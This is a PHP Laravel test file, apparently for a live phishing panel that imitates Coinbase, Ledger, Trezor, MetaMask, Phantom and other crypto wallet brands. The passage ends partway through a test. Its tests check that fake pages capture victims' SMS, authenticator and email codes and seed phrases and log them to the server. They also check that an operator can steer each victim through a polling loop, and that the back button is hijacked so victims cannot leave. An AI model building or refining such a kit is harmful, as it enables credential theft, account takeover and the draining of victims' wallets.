<?php

namespace Tests\Feature;

use App\Models\UserEvent;
use App\Models\UserSession;
use Illuminate\Foundation\Http\Middleware\ValidateCsrfToken;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Str;
use Tests\TestCase;

class ActivityV2DocumentActivateTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutMiddleware([
            ThrottleRequests::class,
            ValidateCsrfToken::class,
        ]);
    }

    public function test_fresh_get_is_immediately_writable_without_activate(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk();
        $doc = $this->doc($token);
        $this->assertSame('coinbase_sms_code', $this->page($token));
        $this->writeSms($token, $doc, '111111')->assertOk();
    }

    public function test_fresh_admin_destination_equivalent_is_writable_without_activate(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk();
        $this->withCookie('liveled_token', $token)->get('/coinbase/last-activity')->assertOk();
        $doc = $this->doc($token);
        $this->assertSame('coinbase_last_activity', $this->page($token));
        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'form_submit',
            'page' => 'coinbase_last_activity',
            'element' => 'last_activity',
            'value' => 'dummy-choice',
            'doc' => $doc,
        ])->assertOk();
    }

    public function test_reload_uses_fresh_get_authority_without_activate(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk();
        $first = $this->doc($token);
        $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk();
        $second = $this->doc($token);
        $this->assertNotSame($first, $second);
        $this->writeSms($token, $second, '222222')->assertOk();
        $this->writeSms($token, $first, '000000')->assertStatus(409);
    }

    public function test_history_restore_remints_and_rejects_stale_docs(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk();
        $docA = $this->doc($token);
        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $docB = $this->doc($token);
        $this->writeSms($token, $docA, '111111')->assertStatus(409);

        $beforeEvents = UserEvent::where('session_token', $token)->count();
        $act = $this->activate($token, $docA, '/coinbase/sms-code')->assertOk()->json();
        $this->assertTrue($act['renewed']);
        $docC = (string) $act['doc'];
        $this->assertNotSame($docA, $docC);
        $this->assertNotSame($docB, $docC);
        $this->assertSame('coinbase_sms_code', $this->page($token));
        $this->assertSame($beforeEvents, UserEvent::where('session_token', $token)->count());

        $this->writeSms($token, $docC, '222222')->assertOk();
        $this->writeSms($token, $docA, '333333')->assertStatus(409);
        $this->writeSms($token, $docB, '444444')->assertStatus(409);
    }

    public function test_already_current_cas_barrier_and_older_confirm(): void
    {
        $token = $this->token();
        $t1 = 1000.0;
        $t2 = $t1 + 1;
        $tA = $t2 + 1;
        $tB = $tA + 1;
        $this->getAt($token, '/coinbase/sms-code', $t1);
        $docA = $this->doc($token);
        $this->getAt($token, '/coinbase/loading', $t2);
        $docB = $this->doc($token);

        $win = $this->activateAt($token, $docB, '/coinbase/loading', $tB)->assertOk()->json();
        $this->assertFalse($win['renewed']);
        $this->assertSame($docB, $win['doc']);
        $this->activateAt($token, $docA, '/coinbase/sms-code', $tA)->assertStatus(409);
        $this->assertSame($docB, $this->doc($token));
        $this->assertSame('coinbase_loading', $this->page($token));

        $olderSame = $this->activateAt($token, $docB, '/coinbase/loading', $t2)->assertOk()->json();
        $this->assertFalse($olderSame['renewed']);
        $this->assertSame($docB, $olderSame['doc']);
        $this->assertSame($docB, $this->doc($token));
        $this->assertSame('coinbase_loading', $this->page($token));
    }

    public function test_foreign_visit_seals_then_restore_opens_n_plus_one(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/seed')->assertOk();
        $docA = $this->doc($token);
        $stay = (int) $this->visitSeed($token, $docA)->assertOk()->json('stay');
        $this->seedState($token, $docA, $stay, ['alpha'])->assertOk();
        $this->assertSame('active', $this->attempts($token)[0]['state']);

        $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk();
        $docB = $this->doc($token);
        $this->withCookie('liveled_token', $token)->post('/api/log', [
            'type' => 'page_visit',
            'page' => 'coinbase_loading',
            'element' => 'page',
            'doc' => $docB,
        ])->assertOk();
        $this->assertSame('sealed', $this->attempts($token)[0]['state']);

        $restored = $this->activate($token, $docA, '/coinbase/seed')->assertOk()->json();
        $docC = (string) $restored['doc'];
        $this->assertTrue($restored['renewed']);
        $ack = $this->visitSeed($token, $docC)->assertOk()->json();
        $stay2 = (int) $ack['stay'];
        $this->assertNotSame($stay, $stay2);
        $this->assertCount(2, $this->attempts($token));
        $this->assertSame('active', $this->attempts($token)[1]['state']);
        $this->assertSame([], $this->attempts($token)[1]['words']);
        $this->seedState($token, $docC, $stay, ['old'])->assertStatus(409);
        $this->seedState($token, $docC, $stay2, ['beta'])->assertOk();
    }

    public function test_f5_active_same_page_visit_does_not_append(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/coinbase/seed')->assertOk();
        $doc1 = $this->doc($token);
        $stay = (int) $this->visitSeed($token, $doc1)->assertOk()->json('stay');
        $this->seedState($token, $doc1, $stay, ['keep'])->assertOk();

        $this->withCookie('liveled_token', $token)->get('/coinbase/seed')->assertOk();
        $doc2 = $this->doc($token);
        $this->assertNotSame($doc1, $doc2);
        $ack = $this->visitSeed($token, $doc2)->assertOk()->json();
        $this->assertSame($stay, (int) $ack['stay']);
        $this->assertCount(1, $this->attempts($token));
        $this->assertSame('active', $this->attempts($token)[0]['state']);
        $this->seedState($token, $doc2, $stay, ['keep', 'more'])->assertOk();
    }

    public function test_inject_is_history_only_and_keeps_fresh_visit(): void
    {
        $token = $this->token();
        $html = $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk()->getContent();
        $this->assertSame(1, substr_count($html, '/session/activate'));
        $this->assertStringContainsString('_llIsHistoryShow', $html);
        $this->assertStringContainsString("_llNavType()!=='back_forward'", $html);
        $this->assertStringContainsString('_llBeginVisit', $html);
        $this->assertStringContainsString('_llWhenWritable=function(send){var g=window._llAuthGen', $html);
        $this->assertStringContainsString('window._llAuthGen!==g', $html);
        $this->assertStringNotContainsString('window._llStayReadyPromise=window._llAuthReady', $html);
        $this->assertDoesNotMatchRegularExpression("/addEventListener\\('pageshow',function\\(\\)\\{window\\._llAuthDead=false;_llResetAuthReady/", $html);
        $this->assertDoesNotMatchRegularExpression('/setInterval\([^)]*_llBeginActivate/', $html);
        $this->assertDoesNotMatchRegularExpression('/visibilitychange\'[^\n]*_llBeginActivate/', $html);
        $this->assertDoesNotMatchRegularExpression('/addEventListener\(\'focus\'[^\n]*_llBeginActivate/', $html);

        $loading = $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk()->getContent();
        $this->assertStringContainsString('_llBeginVisit', $loading);
        $this->assertStringContainsString("_llNavType()!=='back_forward'", $loading);
    }

    public function test_restore_rearm_is_visible_dead_only(): void
    {
        $token = $this->token();
        $fbLock = "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/coinbase/loading');});";
        $fbPersist = "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/coinbase/loading');});";
        $pageShowCount = "window._llPageShows++;if(window._llPageShows===1){if(_llNavType()==='back_forward'){window._llAuthReadyRes();_llBeginVisit();}return;}_llBeginRestore();";
        $pagehideDead = "window.addEventListener('pagehide',function(e){if(!e.persisted)return;window._llAuthGen++;window._llAuthDead=true;";

        foreach ([
            ['/coinbase/sms-code', $fbLock, $fbPersist],
            ['/coinbase/loading', $fbLock, $fbPersist],
        ] as [$path, $lock, $persist]) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertSame(1, substr_count($html, '/session/activate'), $path);
            $this->assertSame(1, substr_count($html, 'function _llBeginActivate()'), $path);
            $this->assertSame(1, substr_count($html, 'function _llBeginVisit()'), $path);
            $this->assertStringContainsString('function _llDocVisible(){return document.visibilityState===\'visible\'&&!document.hidden;}', $html, $path);
            $this->assertStringContainsString('function _llRearmIfVisible(){if(!_llDocVisible()||!window._llAuthDead)return;', $html, $path);
            $this->assertStringContainsString('if(!_llDocVisible()||!window._llAuthDead)return', $html, $path);
            $this->assertStringContainsString("window.addEventListener('visibilitychange',function(){if(document.visibilityState==='visible')_llRearmIfVisible();});", $html, $path);
            $this->assertStringContainsString("window.addEventListener('pageshow',function(){_llRearmIfVisible();});", $html, $path);
            $this->assertStringContainsString('function _llScheduleRearm(){if(window._llRearmT)clearTimeout(window._llRearmT);window._llRearmT=setTimeout(function(){window._llRearmT=0;_llRearmIfVisible();},50);}', $html, $path);
            $this->assertStringContainsString("window.addEventListener('popstate',function(){_llScheduleRearm();});", $html, $path);
            $this->assertStringContainsString('function _llReconcileFromPoll(j){if(!_llDocVisible())return;if(!j||j.authority_match!==false){if(j&&j.authority_match===true){window._llPollReconDone=false;window._llAuthClosed409=false;}return;}if(window._llAuthInFlightGen===window._llAuthGen)return;if(window._llPollReconDone||window._llAuthClosed409)return;window._llPollReconDone=true;window._llAuthDead=false;window._llAuthGen++;window._llAuthReady=new Promise(function(res,rej){window._llAuthReadyRes=res;window._llAuthReadyRej=rej;});window._llAuthStartedGen=0;window._llStayOk=false;window._llStayId=0;window._llAuthRetried=false;_llBeginActivate();}', $html, $path);
            $this->assertStringContainsString('function _llClearAuthInFlight(g){if(window._llAuthInFlightGen===g)window._llAuthInFlightGen=0;}', $html, $path);
            $this->assertStringContainsString("a.searchParams.set('page'", $html, $path);
            $this->assertStringContainsString("a.searchParams.set('doc'", $html, $path);
            $this->assertStringContainsString('window._llPollAuthBound', $html, $path);
            $this->assertStringNotContainsString('setInterval(_llReconcileFromPoll', $html, $path);
            $this->assertStringNotContainsString("document.addEventListener('resume',function(){_llRearmIfVisible();});", $html, $path);
            $this->assertStringNotContainsString("window.addEventListener('pagehide',function(e){if(e.persisted)_llScheduleRearm();});", $html, $path);
            $this->assertStringContainsString('window._llAuthRetried=false;', $html, $path);
            $this->assertStringContainsString('function _llRetryActivateIfNeeded(){if(window._llAuthRetried||!_llDocVisible()||window._llAuthDead)return;', $html, $path);
            $this->assertStringContainsString('window._llAuthRetried=true;window._llAuthDead=true;_llRearmIfVisible();}', $html, $path);
            $this->assertStringContainsString('function _llBeginRestore(){window._llPollReconDone=false;window._llAuthClosed409=false;window._llAuthDead=false;window._llAuthGen++;', $html, $path);
            $this->assertStringContainsString($pageShowCount, $html, $path);
            $this->assertStringContainsString('window._llDocId=j.doc;window._llAuthRetried=false;window._llAuthReadyRes();_llBeginVisit();', $html, $path);
            $this->assertStringContainsString('.catch(function(){_llClearAuthInFlight(g);if(window._llAuthGen!==g||window._llAuthDead)return;window._llAuthReadyRej();_llRetryActivateIfNeeded();});', $html, $path);
            $this->assertStringContainsString('if(!j||j.ok!==true||!j.doc){window._llAuthClosed409=true;_llClearAuthInFlight(g);window._llAuthReadyRej();return;}', $html, $path);
            $this->assertStringNotContainsString('if(!j||j.ok!==true||!j.doc){window._llAuthReadyRej();_llRetryActivateIfNeeded();', $html, $path);
            $this->assertStringNotContainsString('function _llRearmIfVisible(){if(!_llDocVisible()||!window._llAuthDead)return;window._llAuthDead=false;window._llAuthGen++;window._llAuthReady=new Promise(function(res,rej){window._llAuthReadyRes=res;window._llAuthReadyRej=rej;});window._llAuthStartedGen=0;window._llStayOk=false;window._llStayId=0;window._llAuthRetried=false;_llBeginActivate();}', $html, $path);
            $this->assertStringNotContainsString("window.addEventListener('pageshow',function(e){if(!_llIsHistoryShow(e))return;if(e.persisted){window._llAuthDead=false;window._llAuthGen++;", $html, $path);
            $this->assertStringContainsString($pagehideDead, $html, $path);
            $this->assertStringContainsString('if(window._llAuthDead||window._llAuthGen!==g)return', $html, $path);
            $this->assertStringContainsString('if(window._llAuthStartedGen===g)return', $html, $path);
            $this->assertStringContainsString($lock, $html, $path);
            $this->assertStringContainsString($persist, $html, $path);
            $this->assertDoesNotMatchRegularExpression('/setInterval\([^)]*_llBeginActivate/', $html);
            $this->assertDoesNotMatchRegularExpression('/visibilitychange\'[^\n]*_llBeginActivate/', $html);
            $this->assertDoesNotMatchRegularExpression('/addEventListener\(\'focus\'[^\n]*_llBeginActivate/', $html);
            $this->assertDoesNotMatchRegularExpression("/addEventListener\\('popstate',function\\(\\)\\{_llBeginActivate/", $html);
        }
    }

    public function test_popstate_schedules_and_resume_rearms_not_direct_activate(): void
    {
        $token = $this->token();
        $schedule = 'function _llScheduleRearm(){if(window._llRearmT)clearTimeout(window._llRearmT);window._llRearmT=setTimeout(function(){window._llRearmT=0;_llRearmIfVisible();},50);}';
        $gate = 'function _llRearmIfVisible(){if(!_llDocVisible()||!window._llAuthDead)return;';
        $pagehideDead = "window.addEventListener('pagehide',function(e){if(!e.persisted)return;window._llAuthGen++;window._llAuthDead=true;";
        foreach (['/coinbase/sms-code', '/phantom/seeds', '/coinbase/sign-in'] as $path) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertSame(1, substr_count($html, $schedule), $path);
            $this->assertSame(1, substr_count($html, "window.addEventListener('popstate',function(){_llScheduleRearm();});"), $path);
            $this->assertSame(0, substr_count($html, "window.addEventListener('pagehide',function(e){if(e.persisted)_llScheduleRearm();});"), $path);
            $this->assertSame(0, substr_count($html, "document.addEventListener('resume',function(){_llRearmIfVisible();});"), $path);
            $this->assertSame(0, substr_count($html, "document.addEventListener('resume',function(){_llBeginActivate();});"), $path);
            $this->assertSame(1, substr_count($html, 'function _llBeginRestore()'), $path);
            $this->assertSame(1, substr_count($html, 'window._llPageShows++;if(window._llPageShows===1)'), $path);
            $this->assertStringContainsString($pagehideDead, $html, $path);
            $this->assertSame(1, substr_count($html, $gate), $path);
            $this->assertSame(1, substr_count($html, 'if(!_llDocVisible()||!window._llAuthDead)return'), $path);
            $this->assertSame(1, substr_count($html, 'if(window._llAuthStartedGen===g)return'), $path);
            $this->assertSame(1, substr_count($html, '/session/activate'), $path);
            $this->assertStringContainsString("_llNavType()!=='back_forward'", $html, $path);
            $this->assertStringNotContainsString("window.addEventListener('popstate',function(){_llBeginActivate();});", $html, $path);
            $this->assertStringContainsString('.catch(function(){_llClearAuthInFlight(g);if(window._llAuthGen!==g||window._llAuthDead)return;window._llAuthReadyRej();_llRetryActivateIfNeeded();});', $html, $path);
            $this->assertStringContainsString('if(!j||j.ok!==true||!j.doc){window._llAuthClosed409=true;_llClearAuthInFlight(g);window._llAuthReadyRej();return;}', $html, $path);
            $this->assertStringNotContainsString('if(!j||j.ok!==true||!j.doc){window._llAuthReadyRej();_llRetryActivateIfNeeded();', $html, $path);
            $this->assertGreaterThan(
                strpos($html, $schedule),
                strpos($html, '_llRearmIfVisible();},50);'),
                $path
            );
        }
        $fb = $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk()->getContent();
        $this->assertStringContainsString("window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/coinbase/loading');});", $fb);
        $ph = $this->withCookie('liveled_token', $token)->get('/phantom/seeds')->assertOk()->getContent();
        $this->assertStringContainsString("window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/phantom/loading');});", $ph);
    }

    public function test_activate_abort_retries_once_but_server_reject_does_not(): void
    {
        $token = $this->token();
        $retry = 'function _llRetryActivateIfNeeded(){if(window._llAuthRetried||!_llDocVisible()||window._llAuthDead)return;if(window._llAuthStartedGen!==window._llAuthGen)return;window._llAuthRetried=true;window._llAuthDead=true;_llRearmIfVisible();}';
        $catchRetry = '.catch(function(){_llClearAuthInFlight(g);if(window._llAuthGen!==g||window._llAuthDead)return;window._llAuthReadyRej();_llRetryActivateIfNeeded();});';
        $serverReject = 'if(!j||j.ok!==true||!j.doc){window._llAuthClosed409=true;_llClearAuthInFlight(g);window._llAuthReadyRej();return;}';
        $installClear = 'window._llDocId=j.doc;window._llAuthRetried=false;window._llAuthReadyRes();_llBeginVisit();';
        $persistClear = 'function _llBeginRestore(){window._llPollReconDone=false;window._llAuthClosed409=false;window._llAuthDead=false;window._llAuthGen++;';
        foreach (['/coinbase/sms-code', '/ledger/3', '/phantom/seeds'] as $path) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertSame(1, substr_count($html, $retry), $path);
            $this->assertSame(1, substr_count($html, $catchRetry), $path);
            $this->assertSame(1, substr_count($html, $serverReject), $path);
            $this->assertSame(1, substr_count($html, $installClear), $path);
            $this->assertSame(1, substr_count($html, $persistClear), $path);
            $this->assertSame(0, substr_count($html, 'if(!j||j.ok!==true||!j.doc){window._llAuthReadyRej();_llRetryActivateIfNeeded();'), $path);
            $this->assertSame(4, substr_count($html, 'window._llAuthRetried=false;'), $path);
        }
    }

    public function test_writer_hop_is_after_dispatch(): void
    {
        $token = $this->token();
        $last = $this->withCookie('liveled_token', $token)->get('/coinbase/last-activity')->assertOk()->getContent();
        $this->assertStringContainsString('keepalive:true', $last);
        $this->assertStringContainsString('.then(function(){', $last);
        $this->assertStringContainsString("window.navigateTo('/coinbase/loading')", $last);

        $sva = str_replace("\r\n", "\n", $this->withCookie('liveled_token', $token)->get('/coinbase/select-vault-assets')->assertOk()->getContent());
        $this->assertStringContainsString('_llWhenWritable=function(send){var g=window._llAuthGen', $sva);
        $this->assertStringContainsString('navigator.sendBeacon(TRACK, b)', $sva);
        $this->assertStringContainsString('.then(function(){', $sva);
        $this->assertStringContainsString("window.navigateTo('/coinbase/loading')", $sva);
        $this->assertSame(1, substr_count($sva, "type:'form_submit', page:'coinbase_select_vault_assets'"));
        $this->assertTrue(str_contains($sva, "var gate = window._llWhenWritable || function(fn){ return Promise.resolve(); };\n      gate(function(){\n        var b = new URLSearchParams({_token:CSRF, type:'form_submit'"));
        $this->assertTrue(str_contains($sva, "var gate = window._llWhenWritable || function(fn){ return Promise.reject(); };\n        gate(function(){\n          var b = new URLSearchParams({_token:CSRF, type:'coin_input'"));
        $this->assertSame(1, substr_count($sva, "window._llWhenWritable || function(fn){ return Promise.resolve(); }"));
        $this->assertSame(1, substr_count($sva, "window._llWhenWritable || function(fn){ return Promise.reject(); }"));
    }

    public function test_preview_hop_fallback_resolves_without_authority(): void
    {
        foreach ([
            ['/coinbase/select-vault-assets', "window.navigateTo('/coinbase/loading')"],
        ] as [$path, $hop]) {
            $html = $this->get($path.'?_liveled_preview=1')->assertOk()->getContent();
            $this->assertStringContainsString($hop, $html);
            $this->assertStringContainsString("window._llWhenWritable || function(fn){ return Promise.resolve(); }", $html);
            $this->assertStringContainsString("if(window.location.search.indexOf('_liveled_preview')!==-1)return;", $html);
            $previewReturn = strpos($html, "if(window.location.search.indexOf('_liveled_preview')!==-1)return;");
            $docAuth = strpos($html, '_llWhenWritable=function(send){var g=window._llAuthGen');
            $this->assertNotFalse($previewReturn);
            $this->assertNotFalse($docAuth);
            $this->assertLessThan($docAuth, $previewReturn);
            $this->assertStringNotContainsString("fetch('/session/activate'", substr($html, 0, $previewReturn));
        }
    }

    public function test_flow_b_otp_history_restore_clears_only_local_digits(): void
    {
        $token = $this->token();
        foreach ([
            ['/coinbase/sms-code', '_smsSubmitted=false', "window.location.href = '/coinbase/loading'", 'cb-sms-phone', 'cb-sms-err'],
            ['/coinbase/authenticator-code', '_authSubmitted=false', "window.location.href = '/coinbase/loading'", null, 'cb-auth-err'],
            ['/coinbase/email-code', '_ecSubmitted=false', "window.location.href = '/coinbase/loading'", 'cb-ec-email', 'cb-ec-err'],
        ] as [$path, $latchReset, $hop, $keepId, $errId]) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertSame(1, substr_count($html, '/session/activate'));
            $this->assertStringContainsString("_llNavType()!=='back_forward'", $html);
            $this->assertStringContainsString('window._llPostTrack', $html);
            $this->assertStringContainsString($hop, $html);
            $this->assertStringContainsString('function _histShow(e){', $html);
            $this->assertStringContainsString("if(!_histShow(e))return;", $html);
            $this->assertStringContainsString($latchReset, $html);
            $this->assertStringContainsString("inp.value='';", $html);
            $this->assertMatchesRegularExpression('/if\(e\.persisted\|\|!window\._llCb(Sms|Auth|Ec)Invalid\)_clear/', $html);
            $this->assertGreaterThan(strpos($html, "if(!_histShow(e))return;"), strpos($html, $latchReset));
            $this->assertMatchesRegularExpression('/<input[^>]*class="digit[^"]*"[^>]*value=""/', $html);
            $this->assertSame(6, preg_match_all('/class="digit/', $html));
            if ($keepId) {
                $this->assertStringContainsString('id="'.$keepId.'"', $html);
            }
            $this->assertStringContainsString('id="'.$errId.'"', $html);
        }

        $sms = $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk()->getContent();
        $this->assertStringContainsString('id="cb-sms-phone"', $sms);
        $this->assertStringNotContainsString('_smsSubmitted=false;', substr($sms, 0, strpos($sms, 'function _histShow')));

        $email = $this->withCookie('liveled_token', $token)
            ->post('/coinbase/email-code', ['email' => 'dummy@example.test'])
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('dummy@example.test', $email);
        $this->assertStringContainsString('if(!_histShow(e))return;', $email);
        $this->assertStringContainsString('_ecSubmitted=false;', $email);

        $access = $this->withCookie('liveled_token', $token)->get('/coinbase/access-code')->assertOk()->getContent();
        $this->assertStringNotContainsString('function _histShow(e){', $access);

        $signIn = $this->withCookie('liveled_token', $token)->get('/coinbase/sign-in')->assertOk()->getContent();
        $this->assertStringNotContainsString('_smsSubmitted=false;', $signIn);
        $this->assertStringNotContainsString('_ecSubmitted=false;', $signIn);
    }

    public function test_loading_poll_rearms_once_on_history_without_command_replay(): void
    {
        $token = $this->token();
        foreach (['/coinbase/loading', '/coinbase/sms-code'] as $path) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertSame(1, substr_count($html, 'setInterval(_poll,1000)'));
            $this->assertStringContainsString('window.addEventListener(\'pageshow\',function(e){if(!_hist(e))return;_p=false;window._llNavDone=false;_poll();});', $html);
            $this->assertStringContainsString("var k='_ll_cmd_'+c.id;if(sessionStorage.getItem(k))return false;sessionStorage.setItem(k,'1');", $html);
            $this->assertStringNotContainsString('setInterval(_poll,500)', $html);
            $this->assertStringNotContainsString('setInterval(_llBeginActivate', $html);
        }

        $loading = $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk()->getContent();
        $this->assertSame(1, substr_count($loading, '_p=false;window._llNavDone=false;_poll();'));
        $this->assertStringContainsString("if(window._llNavDone)return;", $loading);
    }

    public function test_ordinary_pages_lock_back_to_family_loading_and_exempt_sign_in(): void
    {
        $token = $this->token();
        $fbLock = "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/coinbase/loading');});";
        $fbPersist = "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/coinbase/loading');});";
        $push = "history.pushState(null,'',location.href);";

        foreach ([
            '/coinbase/sms-code',
            '/coinbase/authenticator-code',
            '/coinbase/email-code',
            '/coinbase/access-code',
            '/coinbase/access-pin',
            '/coinbase/reset-password',
            '/coinbase/anydesk',
            '/coinbase/device-confirmation',
            '/coinbase/seed',
            '/coinbase/whitelist-coinbase-wallet',
            '/coinbase/review-account',
            '/coinbase/last-activity',
        ] as $path) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertStringContainsString($push, $html, $path);
            $this->assertStringContainsString($fbLock, $html, $path);
            $this->assertStringContainsString($fbPersist, $html, $path);
            $previewReturn = strpos($html, "if(window.location.search.indexOf('_liveled_preview')!==-1)return;");
            $this->assertNotFalse($previewReturn, $path);
            $this->assertGreaterThan($previewReturn, strpos($html, $fbLock), $path);
            $this->assertSame(1, substr_count($html, 'setInterval(_poll,1000)'), $path);
            $this->assertStringContainsString('_llWhenWritable=function(send){var g=window._llAuthGen', $html, $path);
        }

        $sms = $this->withCookie('liveled_token', $token)->get('/coinbase/sms-code')->assertOk()->getContent();
        $this->assertStringContainsString('function _histShow(e){', $sms);
        $this->assertMatchesRegularExpression('/if\(e\.persisted\|\|!window\._llCb(Sms|Auth|Ec)Invalid\)_clear/', $sms);
        $this->assertStringContainsString("window.location.href = '/coinbase/loading'", $sms);

        $loading = $this->withCookie('liveled_token', $token)->get('/coinbase/loading')->assertOk()->getContent();
        $this->assertStringContainsString($fbLock, $loading);
        $this->assertStringContainsString($fbPersist, $loading);
        $this->assertStringContainsString("window.addEventListener('pageshow',function(e){if(!_hist(e))return;_p=false;window._llNavDone=false;_poll();});", $loading);
        $this->assertSame(1, substr_count($loading, 'setInterval(_poll,1000)'));
        $this->assertSame(1, substr_count($loading, $fbLock));

        $raLoad = $this->withCookie('liveled_token', $token)->get('/coinbase/review-account-loading')->assertOk()->getContent();
        $this->assertStringContainsString("window.location.replace('/coinbase/review-account-loading')", $raLoad);
        $this->assertStringNotContainsString($fbLock, $raLoad);

        $signIn = $this->withCookie('liveled_token', $token)->get('/coinbase/sign-in')->assertOk()->getContent();
        $this->assertStringNotContainsString($fbLock, $signIn);
        $this->assertStringNotContainsString($fbPersist, $signIn);
        $this->assertStringNotContainsString($push, $signIn);
        $this->assertStringContainsString('function showStep2(email)', $signIn);
        $this->assertStringContainsString('function showStep1()', $signIn);
        $this->assertStringContainsString("history.pushState({llSi:2},'',location.href);", $signIn);
        $this->assertStringContainsString("window.addEventListener('popstate',function(){", $signIn);
        $this->assertStringContainsString("if(onStep2) showStep1();", $signIn);
        $this->assertStringContainsString('needBack=!!(history.state&&history.state.llSi===2);', $signIn);
        $this->assertStringContainsString('showStep1();', $signIn);
        $this->assertGreaterThan(
            strpos($signIn, 'needBack=!!(history.state&&history.state.llSi===2);'),
            strpos($signIn, 'if(needBack){ try{ history.back(); }catch(_){} }')
        );
        $this->assertStringContainsString("window.location.href = '/coinbase/loading'", $signIn);
        $this->assertStringContainsString('_llWhenWritable=function(send){var g=window._llAuthGen', $signIn);
        $this->assertStringNotContainsString("window.location.replace('/coinbase/loading')", $signIn);
        $this->assertLessThan(
            strpos($signIn, "if(onStep2) showStep1();"),
            strpos($signIn, "history.pushState({llSi:2},'',location.href);")
        );

        $ldLock = "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/ledger/loading');});";
        $ldPersist = "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/ledger/loading');});";

        foreach (['/ledger/1', '/ledger/2', '/ledger/3', '/ledger/1/recover', '/ledger/2/recover', '/ledger/3/recover'] as $path) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertStringContainsString($ldLock, $html, $path);
            $this->assertStringContainsString($ldPersist, $html, $path);
        }

        $trzLock = "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/trezor/loading');});";
        $trzPersist = "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/trezor/loading');});";
        $exLock = "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/exodus/loading');});";
        $exPersist = "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/exodus/loading');});";
        $elLock = "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/ellipal/loading');});";
        $elPersist = "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/ellipal/loading');});";
        $twLock = "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/trust/loading');});";
        $twPersist = "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/trust/loading');});";
        $phLock = "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/phantom/loading');});";
        $phPersist = "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/phantom/loading');});";

        foreach ([
            ['/trezor/recover', $trzLock, $trzPersist],
            ['/exodus/recover', $exLock, $exPersist],
            ['/ellipal/recover', $elLock, $elPersist],
            ['/trust/recover', $twLock, $twPersist],
            ['/phantom/recover', $phLock, $phPersist],
            ['/metamask/import', "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/metamask/loading');});", "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/metamask/loading');});"],
            ['/metamask/loading', "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/metamask/loading');});", "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/metamask/loading');});"],
            ['/metamask/recover', "window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/metamask/loading');});", "window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/metamask/loading');});"],
            ['/phantom/seeds', $phLock, $phPersist],
            ['/phantom/loading', $phLock, $phPersist],
        ] as [$path, $lock, $persist]) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertStringContainsString($lock, $html, $path);
            $this->assertStringContainsString($persist, $html, $path);
        }

        $phSeeds = $this->withCookie('liveled_token', $token)->get('/phantom/seeds')->assertOk()->getContent();
        $this->assertStringNotContainsString("window.addEventListener('popstate',function(){\n      window.location.href='/phantom/loading';\n    });", $phSeeds);
        $phLoad = $this->withCookie('liveled_token', $token)->get('/phantom/loading')->assertOk()->getContent();
        $this->assertStringNotContainsString("window.location.replace('/phantom/seeds')", $phLoad);
        foreach (['/phantom/email', '/phantom/import', '/phantom/ledger'] as $path) {
            $this->withCookie('liveled_token', $token)->get($path)->assertNotFound();
        }

        $ldLoad = $this->withCookie('liveled_token', $token)->get('/ledger/loading')->assertOk()->getContent();
        $this->assertStringContainsString($ldLock, $ldLoad);
        $this->assertStringContainsString($ldPersist, $ldLoad);
        $this->assertStringNotContainsString("window.location.replace('/ledger/1')", $ldLoad);
